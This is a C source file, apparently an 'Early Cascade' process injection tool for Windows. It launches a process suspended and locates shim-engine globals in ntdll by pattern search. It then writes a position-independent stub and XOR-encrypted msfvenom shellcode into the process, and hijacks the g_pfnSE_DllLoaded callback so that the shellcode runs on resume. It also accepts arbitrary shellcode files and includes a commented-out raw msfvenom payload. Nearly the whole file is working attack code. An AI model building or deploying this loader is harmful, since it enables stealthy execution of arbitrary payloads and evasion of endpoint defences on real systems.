#include <Windows.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>


#define TARGET_PROCESS "Notepad.exe"
#define MAX_PATTERN_SIZE 0x20
#define CHECK_IN_RANGE(dwBasePtr, dwPtr, dwSecPtr) \
    ( \
        dwPtr >= (dwBasePtr + ((PIMAGE_SECTION_HEADER) dwSecPtr)->VirtualAddress) && \
        dwPtr <  (dwBasePtr + ((PIMAGE_SECTION_HEADER) dwSecPtr)->VirtualAddress + ((PIMAGE_SECTION_HEADER) dwSecPtr)->Misc.VirtualSize) ) 


typedef struct _CascadePattern {
    BYTE pData[MAX_PATTERN_SIZE];
    UINT8 un8Size;
    UINT8 un8PcOff; // Rip - PointerToOffset
} CascadePattern;

BYTE x64_stub[] = "\x56\x57\x65\x48\x8b\x14\x25\x60\x00\x00\x00\x48\x8b\x52\x18\x48"
"\x8d\x52\x20\x52\x48\x8b\x12\x48\x8b\x12\x48\x3b\x14\x24\x0f\x84"
"\x85\x00\x00\x00\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x48\x83\xc1"
"\x0a\x48\x83\xe1\xf0\x48\x29\xcc\x49\x89\xc9\x48\x31\xc9\x48\x31"
"\xc0\x66\xad\x38\xe0\x74\x12\x3c\x61\x7d\x06\x3c\x41\x7c\x02\x04"
"\x20\x88\x04\x0c\x48\xff\xc1\xeb\xe5\xc6\x04\x0c\x00\x48\x89\xe6"
"\xe8\xfe\x00\x00\x00\x4c\x01\xcc\x48\xbe\xed\xb5\xd3\x22\xb5\xd2"
"\x77\x03\x48\x39\xfe\x74\xa0\x48\xbe\x75\xee\x40\x70\x36\xe9\x37"
"\xd5\x48\x39\xfe\x74\x91\x48\xbe\x2b\x95\x21\xa7\x74\x12\xd7\x02"
"\x48\x39\xfe\x74\x82\xe8\x05\x00\x00\x00\xe9\xbc\x00\x00\x00\x58"
"\x48\x89\x42\x30\xe9\x6e\xff\xff\xff\x5a\x48\xb8\x11\x11\x11\x11"
"\x11\x11\x11\x11\xc6\x00\x00\x48\x8b\x12\x48\x8b\x12\x48\x8b\x52"
"\x20\x48\x31\xc0\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02"
"\x0f\x85\x83\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x01\xd0\x50"
"\x4d\x31\xdb\x44\x8b\x58\x20\x49\x01\xd3\x48\x31\xc9\x8b\x48\x18"
"\x51\x48\x85\xc9\x74\x69\x48\x31\xf6\x41\x8b\x33\x48\x01\xd6\xe8"
"\x5f\x00\x00\x00\x49\x83\xc3\x04\x48\xff\xc9\x48\xbe\x38\x22\x61"
"\xd4\x7c\xdf\x63\x99\x48\x39\xfe\x75\xd7\x58\xff\xc1\x29\xc8\x91"
"\x58\x44\x8b\x58\x24\x49\x01\xd3\x66\x41\x8b\x0c\x4b\x44\x8b\x58"
"\x1c\x49\x01\xd3\x41\x8b\x04\x8b\x48\x01\xd0\xeb\x43\x48\xc7\xc1"
"\xfe\xff\xff\xff\x5a\x4d\x31\xc0\x4d\x31\xc9\x41\x51\x41\x51\x48"
"\x83\xec\x20\xff\xd0\x48\x83\xc4\x30\x5f\x5e\x48\x31\xc0\xc3\x59"
"\x58\xeb\xf6\xbf\x05\x15\x00\x00\x48\x31\xc0\xac\x38\xe0\x74\x0f"
"\x49\x89\xf8\x48\xc1\xe7\x05\x4c\x01\xc7\x48\x01\xc7\xeb\xe9\xc3"
"\xe8\xb8\xff\xff\xff";


/* Created by msfvenom ( msfvenom -a x64 -p windows/x64/exec CMD=calc.exe -f c ) */
// Removed because Shellcode comes encrypted now
/*BYTE x64_sc_2[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
*/



LPVOID encode_system_ptr(LPVOID ptr) {
    // get pointer cookie from SharedUserData!Cookie (0x330)
    ULONG cookie = *(ULONG*)0x7FFE0330;

    // encrypt our pointer so it'll work when written to ntdll
    return (LPVOID)_rotr64(cookie ^ (ULONGLONG)ptr, cookie & 0x3F);
}

LPVOID find_pattern(LPBYTE pBuffer, DWORD dwSize, LPBYTE pPattern, DWORD dwPatternSize)
{
    if (dwSize > dwPatternSize) // Avoid OOB
        while ((dwSize--) - dwPatternSize) {
            if (RtlCompareMemory(pBuffer, pPattern, dwPatternSize) == dwPatternSize)
                return pBuffer;

            pBuffer++;
        }

    return NULL;
}

LPVOID find_SE_DllLoadedAddress(HANDLE hNtDLL, LPVOID* ppOffsetAddress) {
    DWORD dwValue;
    DWORD_PTR dwPtr;
    DWORD_PTR dwTextPtr;
    DWORD_PTR dwTextEndPtr;
    DWORD_PTR dwMRDataPtr;
    DWORD_PTR dwResultPtr;
    CascadePattern aPatterns[] = { /* We are searching for these patterns: */
        {
            /*

                8b14253003fe7f       mov     edx, dword ptr [7FFE0330h]
                8bc2                 mov     eax, edx
                488b3d??????00       mov     rdi, qword ptr [ntdll!g_pfnSE_DllLoaded (????????????)]
            */
            .pData = "\x8B\x14\x25\x30\x03\xFE\x7F\x8B\xC2\x48\x8B\x3D",
            .un8Size = 0x0C,
            .un8PcOff = 0x04
        },

        /* Sentinel */
        { 0x00 }
    };

    /* Nt Headers */
    dwPtr = (DWORD_PTR)hNtDLL + ((PIMAGE_DOS_HEADER)hNtDLL)->e_lfanew;

    /* Get the number of ntdll sections */
    dwValue = ((PIMAGE_NT_HEADERS)dwPtr)->FileHeader.NumberOfSections;

    /* The beginning of the section headers */
    dwPtr = (DWORD_PTR) & ((PIMAGE_NT_HEADERS)dwPtr)->OptionalHeader + ((PIMAGE_NT_HEADERS)dwPtr)->FileHeader.SizeOfOptionalHeader;

    while (dwValue--) {
        /* Save .text section header */
        if (strcmp(((PIMAGE_SECTION_HEADER)dwPtr)->Name, ".text") == 0)
            dwTextPtr = dwPtr;

        /* Find .mrdata section header */
        if (strcmp(((PIMAGE_SECTION_HEADER)dwPtr)->Name, ".mrdata") == 0)
            dwMRDataPtr = dwPtr;

        /* Next section header */
        dwPtr += sizeof(IMAGE_SECTION_HEADER);
    }

    /* Look for all specified patterns */
    for (CascadePattern* pPattern = aPatterns; pPattern->un8Size; pPattern++) {
        /* Points to the beginning of .text section */
        dwResultPtr = (DWORD_PTR)hNtDLL + ((PIMAGE_SECTION_HEADER)dwTextPtr)->VirtualAddress;

        /* The end of .text section */
        dwTextEndPtr = dwResultPtr + ((PIMAGE_SECTION_HEADER)dwTextPtr)->Misc.VirtualSize;

        while (dwResultPtr = (DWORD_PTR)find_pattern((LPBYTE)dwResultPtr, dwTextEndPtr - dwResultPtr, pPattern->pData, pPattern->un8Size)) {
            /* Get the offset address */
            dwResultPtr += pPattern->un8Size;

            /* Ensure the validity of the opcode we rely on */
            if ((*(BYTE*)(dwResultPtr + 0x3)) == 0x00) {
                /* Fetch the address */
                dwPtr = (DWORD_PTR)(*(DWORD32*)dwResultPtr) + dwResultPtr + pPattern->un8PcOff;

                /* Is that address in the range we expect!? */
                if (CHECK_IN_RANGE((DWORD_PTR)hNtDLL, dwPtr, dwMRDataPtr)) {
                    /* Set the offset address */
                    if (ppOffsetAddress)
                        (*ppOffsetAddress) = (LPVOID)dwResultPtr;

                    return (LPVOID)dwPtr;
                }
            }
        }

    }

    /* Failed to find the address */
    (*ppOffsetAddress) = NULL;

    return NULL;
}

LPVOID find_ShimsEnabledAddress(HANDLE hNtDLL, LPVOID pDllLoadedOffsetAddress) {
    DWORD dwValue;
    DWORD_PTR dwPtr;
    DWORD_PTR dwResultPtr;
    DWORD_PTR dwEndPtr;
    DWORD_PTR dwDataPtr;
    CascadePattern aPatterns[] = { /* We are looking for these patterns: */
        {
            /*
                c605??????0001       mov     byte ptr [ntdll!g_ShimsEnabled (????????????)], 1
            */
            .pData = "\xc6\x05",
            .un8Size = 0x02,
            .un8PcOff = 0x05
        },
        {
            /*
                443825??????00       cmp     byte ptr [ntdll!g_ShimsEnabled (????????????)], r12b
            */
            .pData = "\x44\x38\x25",
            .un8Size = 0x03,
            .un8PcOff = 0x04
        },

        /* Sentinel */
        { 0x00 }
    };

    /* Nt Headers */
    dwPtr = (DWORD_PTR)hNtDLL + ((PIMAGE_DOS_HEADER)hNtDLL)->e_lfanew;

    /* Get the number of ntdll sections */
    dwValue = ((PIMAGE_NT_HEADERS)dwPtr)->FileHeader.NumberOfSections;

    /* The beginning of the section headers */
    dwPtr = (DWORD_PTR) & ((PIMAGE_NT_HEADERS)dwPtr)->OptionalHeader + ((PIMAGE_NT_HEADERS)dwPtr)->FileHeader.SizeOfOptionalHeader;

    while (dwValue--) {
        /* Find .data section header */
        if (strcmp(((PIMAGE_SECTION_HEADER)dwPtr)->Name, ".data") == 0) {
            dwDataPtr = dwPtr;
            break;
        }

        /* Next section header */
        dwPtr += sizeof(IMAGE_SECTION_HEADER);
    }

    /* Look for all specified patterns */
    for (CascadePattern* pPattern = aPatterns; pPattern->un8Size; pPattern++) {
        /* Searching from the address where we found the offset of SE_DllLoadedAddress */
        dwPtr = dwEndPtr = (DWORD_PTR)pDllLoadedOffsetAddress;

        /* Also take a look in the place just before this address */
        dwPtr -= 0xFF;

        /* End of block we are searching in */
        dwEndPtr += 0xFF;

        while (dwPtr = (DWORD_PTR)find_pattern((LPBYTE)dwPtr, dwEndPtr - dwPtr, pPattern->pData, pPattern->un8Size)) {
            /* Jump into the offset */
            dwPtr += pPattern->un8Size;

            /* Ensure the validity of the opcode we rely on */
            if ((*(BYTE*)(dwPtr + 0x3)) == 0x00) {
                /* Fetch the address */
                dwResultPtr = (DWORD_PTR)(*(DWORD32*)dwPtr) + dwPtr + pPattern->un8PcOff;

                /* Is that address in the range we expect!? */
                if (CHECK_IN_RANGE((DWORD_PTR)hNtDLL, dwResultPtr, dwDataPtr))
                    return (LPVOID)dwResultPtr;
            }
        }
    }

    return NULL;
}

unsigned char* read_sc(const char* filename, size_t* sc_size) {
    FILE* file = fopen(filename, "rb");
    if (!file) {
        perror("Error opening file");
        exit(EXIT_FAILURE);
    }

    // Checking File Size
    fseek(file, 0, SEEK_END);
    *sc_size = ftell(file);
    fseek(file, 0, SEEK_SET);

    // Allocate decent memory
    unsigned char* buffer = (unsigned char*)malloc(*sc_size);
    if (!buffer) {
        perror("Error allocating memory");
        fclose(file);
        exit(EXIT_FAILURE);
    }
    fread(buffer, 1, *sc_size, file);
    fclose(file);

    return buffer;
}

// Xor Decryption function with dynamic key
uint8_t* MultiXORDecrypt(const uint8_t* encryptedData, size_t dataSize, const uint8_t* key, size_t keySize) {
    uint8_t* decrypted = (uint8_t*)malloc(dataSize);
    if (decrypted == NULL) {
        return NULL;
    }

    for (size_t i = 0; i < dataSize; i++) {
        decrypted[i] = encryptedData[i] ^ key[i % keySize];
    }

    return decrypted;
}

int main(int argc, char** argv) {

    HANDLE hNtDLL;
    PROCESS_INFORMATION pi = { 0 };
    STARTUPINFOA si = { 0 };
    LPVOID pBuffer;
    LPVOID pShimsEnabledAddress;
    LPVOID pSE_DllLoadedAddress;
    LPVOID pPtr;
    int nSuccess = EXIT_FAILURE;
    BOOL bEnable = TRUE;
#if defined(_WIN32) && !defined(_WIN64)
    BOOL bIsWow64 = FALSE;
#endif

    puts(

        "\n"
        "              (        (                     (                \n"
        " (      ) (   )\\(      )\\     )           )  )\\ )  (       \n"
        " )\\  ( /( )( ((_)\\ ) (((_) ( /( (   (  ( /( (()/( ))\\      \n"
        "((_) )(_)|()\\ _(()/( )\\___ )(_)))\\  )\\ )(_)) ((_))((_)    \n"
        "| __((_)_ ((_) |)(_)|(/ __((_)_((_)((_|(_)_  _| (_))          \n"
        "| _|/ _` | '_| | || || (__/ _` (_-< _|/ _` / _` / -_)         \n"
        "|___\\__,_|_| |_|\\_, | \\___\\__,_/__|__|\\__,_\\__,_\\___|  \n"
        "                |__/                                          \n"
        "Originally by =>  @0xNinjaCyclone - Improoved by Karkas\n"
        "usage: <prog> <sc-file> <injection-process> (or leave empty!)\n"
        "Currently only msfv3n0m p4yloads supported"
        "\n"

    );
    // Xor Calc Payload
    uint8_t sc[] = { 0x78, 0x26, 0x70, 0x46, 0x35, 0x8f, 0x2c, 0xa6, 0xf2, 0x2e, 0x67, 0xac, 0x40, 0xa6, 0x1e, 0xf1, 0x3e, 0xbf, 0xfb, 0x52, 0xe1, 0x26, 0x78, 0xf0, 0xa5, 0x2f, 0x67, 0xf4, 0xea, 0x66, 0xad, 0xaf, 0x21, 0xbe, 0xc7, 0xd2, 0x38, 0xbf, 0xc5, 0x37, 0xce, 0x24, 0xbe, 0x93, 0x0c, 0x2f, 0xdd, 0x66, 0x5e, 0x12, 0x47, 0x81, 0x03, 0xda, 0x6c, 0xe1, 0xa9, 0x3e, 0xc7, 0xc1, 0x85, 0xaf, 0x11, 0x4f, 0x97, 0x26, 0xbd, 0xee, 0x79, 0x7c, 0x06, 0x76, 0x43, 0xca, 0x04, 0xa1, 0xb8, 0x7c, 0x4a, 0x08, 0x84, 0x6e, 0xf3, 0xea, 0x40, 0xa7, 0x98, 0xc1, 0xba, 0x2f, 0xf6, 0xad, 0x8a, 0xbe, 0x54, 0xe4, 0xe3, 0xb7, 0xea, 0xc9, 0x85, 0xbe, 0x10, 0xf4, 0x8d, 0x98, 0x25, 0xe7, 0x79, 0x1a, 0xae, 0xb5, 0x00, 0x20, 0x01, 0x91, 0xa1, 0xbf, 0xfb, 0x40, 0x28, 0x2f, 0x32, 0x6b, 0xc8, 0x26, 0xed, 0x67, 0xca, 0xce, 0x53, 0x0c, 0x4d, 0xf5, 0x00, 0x84, 0x60, 0xb2, 0xf3, 0x51, 0xf1, 0xb6, 0xab, 0xe6, 0x4e, 0x27, 0xc8, 0xef, 0xf3, 0xfe, 0x40, 0xbc, 0x8a, 0xfa, 0x04, 0xe4, 0xe3, 0xb7, 0xd6, 0xc9, 0x85, 0xbe, 0xb2, 0x29, 0xc1, 0xef, 0xa4, 0xa7, 0x22, 0x6f, 0x7e, 0xbc, 0x59, 0xa8, 0x15, 0xfa, 0x29, 0xaf, 0x8b, 0xd9, 0xc5, 0x34, 0xbb, 0x21, 0x29, 0x47, 0xad, 0xf4, 0x0d, 0xce, 0x7e, 0xbc, 0x58, 0xac, 0x04, 0x2b, 0x7a, 0x1e, 0x9d, 0x7f, 0x7b, 0x91, 0xae, 0xea, 0x7f, 0x66, 0xec, 0xa6, 0xf2, 0x2e, 0x26, 0xfd, 0x01, 0xbe, 0xc1, 0x2d, 0x69, 0xf6, 0xca, 0x80, 0xc5, 0xd4, 0xc2, 0x29, 0xaa, 0xe0, 0x13, 0x73, 0x49, 0xde, 0x93, 0x5f, 0x57, 0xb7, 0xf6, 0x06, 0xfd, 0x4a, 0x57, 0x7f, 0x51, 0x26, 0x70, 0x66, 0xed, 0x5b, 0xea, 0xda, 0xf8, 0xae, 0xdd, 0x1d, 0x74, 0xf3, 0xf7, 0xe7, 0x7b, 0x85, 0xa5, 0xea, 0x84, 0x37, 0xb2, 0x2b, 0x1f, 0x98, 0x39, 0xc5, 0x93, 0x42, 0x45, 0xd3, 0x64, 0x8e, 0x29, 0xa0 };
    size_t sc_size = sizeof(sc);
    // Xor decryption key
    uint8_t xorKey[] = { 0x84, 0x6e, 0xf3, 0xa2, 0xc5, 0x67, 0xec, 0xa6, 0xf2, 0x2e, 0x26, 0xfd, 0x01, 0xf6, 0x4c, 0xa0, 0x68, 0xf7, 0xca, 0x80 };
    // Reconstruct the payload with key
    uint8_t* x64_sc = MultiXORDecrypt(sc, sc_size, xorKey, sizeof(xorKey));

     printf("[*] Size of embedded XOR SC is (%zu)\n", sc_size);

    // Read Shellcode from file if path has been supplied via Cmd args
    if (argc >= 2) {
        printf("[*] Getting SC from file\n");
        x64_sc = read_sc(argv[1], &sc_size);
    }
    printf("[*] Size of the supplied SC File %s is (%zu)\n", argv[1], sc_size);

    char target_process[MAX_PATH];
    // Read Process name from cmd Args if supplied
    if (argc > 2) {
        strcpy(target_process, argv[2]);
    }
    else {
        strcpy(target_process, TARGET_PROCESS);
    }

    si.cb = sizeof(STARTUPINFOA);

    printf("[*] Create a process in suspended mode ( %s )\n", target_process);

    if (!CreateProcessA(
        NULL,
        target_process,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        //(LPCSTR) "C:\\Windows\\System32\\", // Wtf 0xNinjaCyclone ???
        NULL,
        &si,
        &pi
    ))
        return nSuccess;

    puts("[+] The process has been created successfully");

    puts("[*] Getting a handle on NtDLL");
    hNtDLL = GetModuleHandleA("NtDLL");
    printf("[+] NtDLL Base Address = 0x%p\n", hNtDLL);


    do {

#if defined(_WIN32) && !defined(_WIN64)
        if (IsWow64Process(pi.hProcess, &bIsWow64) && bIsWow64)
            goto CASCADE;
#endif

#if !defined(_WIN64)
        puts("[-] This PoC targets x64 processes only");
        break;
#endif

    CASCADE:
        puts("[*] Dynamically Search for the Callback Pointer Address ( g_pfnSE_DllLoaded )");
        if (!(pSE_DllLoadedAddress = find_SE_DllLoadedAddress(hNtDLL, &pPtr)))
            break;

        printf("[+] Found the Callback Address at 0x%p\n", pSE_DllLoadedAddress);

        puts("[*] Dynamically Search for the Enabling Flag Address ( g_ShimsEnabled )");
        if (!(pShimsEnabledAddress = find_ShimsEnabledAddress(hNtDLL, pPtr)))
            break;

        printf("[+] Found the Enabling Flag Address at 0x%p\n", pShimsEnabledAddress);

        puts("[*] Remotely allocate memory for both stub & sc");
        if (!(pBuffer = VirtualAllocEx(pi.hProcess, NULL, sizeof(x64_stub) + sc_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)))
            break;

        /* sc address */
        pPtr = (LPVOID)((DWORD_PTR)pBuffer + sizeof(x64_stub));

        printf("[+] Our stub will be injected at 0x%p\n", pBuffer);
        printf("[+] Our sc will be injected at 0x%p\n", pPtr);

        /* Tell the stub where the enabling flag is located */
        RtlCopyMemory(find_pattern(x64_stub, sizeof(x64_stub), "\x11\x11\x11\x11\x11\x11\x11\x11", 8), &pShimsEnabledAddress, sizeof(LPVOID));

        puts("[*] Injecting our cascade stub");
        if (!WriteProcessMemory(pi.hProcess, pBuffer, x64_stub, sizeof(x64_stub), NULL))
            break;

        puts("[+] Our stub has been successfully injected into the remote process");

        puts("[*] Injecting our sc");
        if (!WriteProcessMemory(pi.hProcess, pPtr, x64_sc, sc_size, NULL))
            break;

        puts("[+] Our sc has been successfully injected into the remote process");

        pPtr = encode_system_ptr((LPVOID)pBuffer);
        printf("[*] The Callback Address has been encoded to 0x%p\n", pPtr);

        puts("[*] Hijacking the Callback for making it executes our stub");
        if (!WriteProcessMemory(pi.hProcess, pSE_DllLoadedAddress, (LPCVOID)&pPtr, sizeof(LPVOID), NULL))
            break;

        puts("[+] Hijacking has been done successfully");

        puts("[*] Enabling Shim Engine for triggering our stub later");
        if (!WriteProcessMemory(pi.hProcess, pShimsEnabledAddress, (LPCVOID)&bEnable, sizeof(BOOL), NULL))
            break;

        puts("[+] Shim Engine is enabled now");

        puts("[*] Triggering the callback");
        if (!ResumeThread(pi.hThread))
            break;

        puts("[+] Injection has been done successfully");
        nSuccess = EXIT_SUCCESS;

    } while (FALSE);

    if (nSuccess == EXIT_FAILURE) {
        puts("[-] Unfortunately, failed to cascade the process!");

        if (pi.hProcess)
            TerminateProcess(pi.hProcess, EXIT_FAILURE);

        puts("[*] Target process has terminated");
    }

    puts("[*] Cleaning up");
    if (pi.hThread)
        CloseHandle(pi.hThread);

    if (pi.hProcess)
        CloseHandle(pi.hProcess);

    return nSuccess;
}
